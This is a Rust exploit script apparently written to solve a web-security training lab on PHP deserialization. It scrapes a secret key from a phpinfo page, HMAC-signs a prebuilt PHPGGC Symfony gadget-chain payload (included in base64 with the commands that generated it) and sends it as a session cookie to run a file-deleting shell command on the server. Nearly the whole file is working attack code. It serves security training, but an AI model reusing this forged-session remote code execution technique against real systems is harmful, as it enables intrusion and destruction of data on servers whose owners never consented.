/********************************************************************
*
* Lab: Exploiting PHP deserialization with a pre-built gadget chain
*
* Hack Steps:
*      1. Fetch the phpinfo page
*      2. Extract the secret key
*      3. Sign the payload with the secret key
*      4. Fetch the home page with the modified object as session
*         to delete the morale.txt file
*
*********************************************************************/
#![feature(ascii_char)]
use hex;
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use ring::hmac::{self, HMAC_SHA1_FOR_LEGACY_USE_ONLY};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a28001404de35178860a56d00090075.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("â¦—1â¦˜ Fetching the phpinfo page.. ");
    flush_terminal();

    let phpinfo_page = fetch("/cgi-bin/phpinfo.php");

    println!("{}", "OK".green());
    print!("â¦—2â¦˜ Extracting the secret key.. ");
    flush_terminal();

    let body = phpinfo_page.text().unwrap();
    let secret_key =
        capture_pattern_from_text(r###"SECRET_KEY </td><td class="v">(\w*) </td>"###, &body);

    println!("{} => {}", "OK".green(), secret_key.yellow());
    print!("â¦—3â¦˜ Signing the payload with the secret key.. ");
    flush_terminal();

    /*
        this payload was generated using the following commands:
        ~$ git clone https://github.com/ambionics/phpggc.git
        ~$ cd phpggc
        ~$ ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0
    */
    let payload = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
    let sig_hmac_sh1 = compute_hmac_sha1(&secret_key, &payload);
    let serialized_object =
        format!(r###"{{"token":"{payload}","sig_hmac_sha1":"{sig_hmac_sh1}"}}"###);

    println!("{}", "OK".green());
    print!(
        "â¦—4â¦˜ Fetching the home page with the modified object as session to delete the morale.txt file.. "
    );
    flush_terminal();

    fetch_with_session("/", &serialized_object);

    println!("{}", "OK".green());
    println!("ðŸ—¹ The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("â¦—!â¦˜ Failed to fetch: {}", path.red()))
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "â¦—!â¦˜ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn compute_hmac_sha1(secret_key: &str, data: &str) -> String {
    let signing_key = hmac::Key::new(HMAC_SHA1_FOR_LEGACY_USE_ONLY, secret_key.as_bytes());
    let signature = hmac::sign(&signing_key, data.as_bytes());

    hex::encode(signature)
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("â¦—!â¦˜ Failed to fetch: {}", path.red()))
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
